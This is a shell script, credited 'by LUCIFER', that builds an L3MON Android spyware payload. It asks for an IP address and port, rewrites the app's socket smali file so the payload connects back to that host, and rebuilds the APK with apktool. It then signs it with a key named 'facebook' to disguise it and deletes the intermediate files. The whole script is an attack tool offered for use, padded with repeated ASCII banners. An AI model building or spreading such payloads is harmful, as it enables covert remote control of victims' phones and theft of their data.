#!/usr/bin/env sh

RED='\033[0;31m'
GRN='\033[0;32m'
SAF='\033[38;5;202m'
WIT='\033[37m'
NC='\033[0m'

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

smaliFile="smali/com/etechd/l3mon/IOSocket.smali"

if [ -d $PREFIX/opt/l3mon ]; then

    appPath="$PREFIX/opt/l3mon/payload"
fi

read -p "π…΄π…½π†ƒπ…΄π† π†π…Ύπ†„π† π…Έπ…Ώ   :" host
read -p "π…΄π…½π†ƒπ…΄π† π†π…Ύπ†„π† π…Ώπ…Ύπ†π†ƒ:" port


sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload${NC}"
sleep 5

apktool b "$appPath" -o $HOME/l3mon_output/l3mon_unsigned.apk
clear
cd $HOME/l3mon_output

clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key${NC}"
sleep 5

keytool -genkeypair -alias facebook -keyalg RSA -keysize 2048 -validity 10000 -keystore key.jks -storepass lucifer -dname "CN=facebook, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload${NC}"
sleep 5

zipalign -v 4 l3mon_unsigned.apk l3mon_zipaligned.apk
clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                          by LUCIFER    ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload${NC}"
sleep 5

apksigner sign --ks key.jks --ks-key-alias facebook --ks-pass pass:lucifer --out l3mon_signed.apk l3mon_zipaligned.apk
clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : done${NC}"
echo "${WIT}[*]Removing Junk files${NC}"
sleep 5

rm l3mon_signed.apk.idsig key.jks l3mon_unsigned.apk l3mon_zipaligned.apk 
clear

echo "${SAF}    β”β”“β•‹β•‹β”β”β”β”β”³β”β”“β”β”β”³β”β”β”β”³β”β”“β•‹β”β”“ β”β”β”β”“β”β”“β•‹β”β”³β”β”β”³β”“β•‹β•‹β”β”β”β”β”³β”β”β”β”³β”β”β”β”“    ${NC}"
echo "${SAF}    β”ƒβ”ƒβ•‹β•‹β”ƒβ”β”β”“β”ƒβ”ƒβ”—β”›β”ƒβ”ƒβ”β”β”“β”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”“β”ƒβ”ƒβ”ƒβ•‹β”ƒβ”£β”«β”£β”«β”ƒβ•‹β•‹β”—β”“β”β”“β”ƒβ”β”β”β”«β”β”β”“β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β•‹β”—β”›β”β”›β”ƒβ”β”“β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”β”“β”—β”›β”ƒ β”ƒβ”—β”›β”—β”«β”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β•‹β•‹β”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”β”«β”—β”β”›β”ƒ    ${NC}"
echo "${WIT}    β”ƒβ”ƒβ•‹β”β”³β”“β”—β”“β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”—β”“β”ƒβ”ƒ β”ƒβ”β”β”“β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ•‹β”β”“β”ƒβ”ƒβ”ƒβ”ƒβ”β”β”β”«β”β”“β”β”›    ${NC}"
echo "${WIT}    β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”ƒβ”—β”β”›β”ƒβ”ƒβ•‹β”ƒβ”ƒβ”ƒ β”ƒβ”—β”β”›β”ƒβ”—β”β”›β”£β”«β”£β”«β”—β”β”›β”£β”›β”—β”›β”ƒβ”—β”β”β”«β”ƒβ”ƒβ”—β”“    ${NC}"
echo "${GRN}    β”—β”β”β”β”»β”β”β”β”»β”›β”—β”›β”—β”»β”β”β”β”»β”›β•‹β”—β”β”› β”—β”β”β”β”»β”β”β”β”»β”β”β”»β”β”β”β”»β”β”β”β”»β”β”β”β”»β”›β”—β”β”›    ${NC}"
echo "${GRN}                         by LUCIFER ${NC}"

echo "${SAF}[*]Building Payload : Done${NC}"
echo "${SAF}[*]Generating signing key : Done${NC}"
echo "${WIT}[*]Zipaligning the payload : Done${NC}"
echo "${WIT}[*]Signing the Payload : Done${NC}"
echo "${WIT}[*]Removing Junk files : Done${NC}"
echo "${GRN}[*]DONE! l3mon_signed built success${NC}"
echo "${GRN}[*]It can be found under HOME/l3mon_output Directory${NC}"